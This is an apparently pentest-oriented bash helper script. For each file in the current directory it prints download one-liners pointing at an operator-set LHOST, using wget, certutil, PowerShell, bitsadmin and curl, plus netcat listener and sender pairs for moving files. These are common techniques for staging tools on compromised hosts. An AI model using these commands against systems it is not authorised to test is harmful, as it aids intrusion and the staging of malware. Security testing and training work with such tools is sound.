#!/bin/bash

#
# Original by: kintsugi-sec (https://github.com/kintsugi-sec)
# Curl and Powershell added by: opesc-infosec (https://github.com/opsec-infosec)
#

GREEN='\033[0;32m'
RED='\033[0;31m'
BLUE='\033[0;34m'
WHITE='\033[0;37m'
RESET='\033[0m'

if [ "$#" -ne 1 ]; then
    echo "Usage: $0 <port>"
    exit 1
fi

# lhost must be set with export turtlepower_lhost=IP_ADDRESS
[[ -z "$turtlepower_lhost" ]] && { echo -e "LHOST not set do it with export turtlepower_lhost=IP_ADDRESS \n**TRY turtlepower_lhost to output it ** "; exit 1; }

echo "File Transfer Method?"
echo -e "${GREEN}1${RESET} Wget"
echo -e "${GREEN}2${RESET} Certutil Method #1"
echo -e "${GREEN}3${RESET} Certutil Method #2"
echo -e "${GREEN}4${RESET} Powershell Download Method #1"
echo -e "${GREEN}5${RESET} Powershell Download Method #2"
echo -e "${GREEN}6${RESET} Bitsadmin"
echo -e "${GREEN}7${RESET} Curl"
echo -e "${GREEN}8${RESET} nc linux"
echo -e "${GREEN}9${RESET} nc windows"
echo ""
read FILE_TRANSFER_METHOD


# this is a template for adding on another option
# new option
# elif [ "$FILE_TRANSFER_METHOD" = "6" ]
# then
# 	echo ""
# 	echo "6 New Option:"
# 	echo ""
#	for i in $(ls); do echo "wget http://$turtlepower_lhost/$i:$1 $i"; done; 


# wget method
if [ "$FILE_TRANSFER_METHOD" = "1" ] ; then
	echo ""
	echo -e "${BLUE}Wget method:${RESET}"
	echo ""
	for i in $(ls); do echo "wget http://$turtlepower_lhost:$1/$i $i"; done;
#Certutil Method #1
elif [ "$FILE_TRANSFER_METHOD" = "2" ]
then
	echo ""
	echo -e "${BLUE}Certutil Method #1:${RESET}"
	echo ""
	for i in $(ls); do echo "certutil -urlcache -f http://$turtlepower_lhost:$1/$i $i"; done;
#Certutil Method #2
elif [ "$FILE_TRANSFER_METHOD" == "3" ]
then
	echo ""
	echo -e "${BLUE}Certutil Method #2:${RESET}"
	echo ""
	for i in $(ls); do echo "certutil.exe -urlcache -split -f http://$turtlepower_lhost:$1/$i $i"; done;
# Powershell Download
elif [ "$FILE_TRANSFER_METHOD" == "4" ]
then
	echo ""
	echo -e "${BLUE}Powershell Download Method #1:${RESET}"
	echo ""
	for i in $(ls); do echo "powershell -c (New-Object Net.WebClient).DownloadFile('http://$turtlepower_lhost:$1/$i', '$i.exe')"; done; 
elif [ "$FILE_TRANSFER_METHOD" == "5" ]
# powershell.exe Invoke-WebRequest -Uri 'http://127.0.0.1/nc.exe' -OutFile 'nc.exe'
then
    echo ""
    echo -e "${BLUE}Powershell Download Method #2:${RESET}"
    echo ""
    for i in $(ls); do echo "powershell.exe Invoke-WebRequest -Uri 'http://$turtlepower_lhost:$1/$i' -OutFile '$i'"; done; 
# Bitsadmin
elif [ "$FILE_TRANSFER_METHOD" == "6" ]
then
	echo ""
	echo -e "${BLUE}Bitsadmin method:${RESET}"
	echo ""
	for i in $(ls); do echo "bitsadmin /transfer job /download /priority high http://$turtlepower_lhost:$1/$i $i"; done;
# Curl
elif [ "$FILE_TRANSFER_METHOD" == "7" ]
then
    echo ""
    echo -e "${BLUE}Curl method:${RESET}"
    echo ""
    for i in $(ls); do echo "curl http://$turtlepower_lhost:$1/$i $i"; done;
# nc linux
elif [ "$FILE_TRANSFER_METHOD" == "8" ]
then
    echo ""
    echo -e "${BLUE}Linux nc sending method${RESET}"
    echo ""
    echo -e "${BLUE}RECEIVER${RESET}"
    echo ""
    if [ $1 -lt 1024 ]; then
        for i in $(ls); do echo "sudo nc -lvnp $1 >./$i"; done;
    else
        for i in $(ls); do echo "nc -lvnp $1 >./$i"; done;
    fi
    echo ""
    echo -e "${BLUE}SENDER${RESET}"
    echo ""
    for i in $(ls); do echo "cat ./$i | nc -nv $turtlepower_lhost $1";done;
# nc windows
elif [ "$FILE_TRANSFER_METHOD" == "9" ]
then
    echo ""
    echo -e "${BLUE}Windows nc sending method${RESET}"
    echo ""
    echo -e "${BLUE}RECEIVER${RESET}"
    echo ""
    for i in $(ls); do echo ".\nc.exe -lvnp 443 >.\\$i"; done;
    echo ""
    echo -e "${BLUE}SENDER${RESET}"
    echo ""
    for i in $(ls); do echo "cat .\\$i | nc.exe -nv $turtlepower_lhost $1";done;
# not a method
else
	echo -e "${RED}Not a known file transfer method.${RESET}"
fi
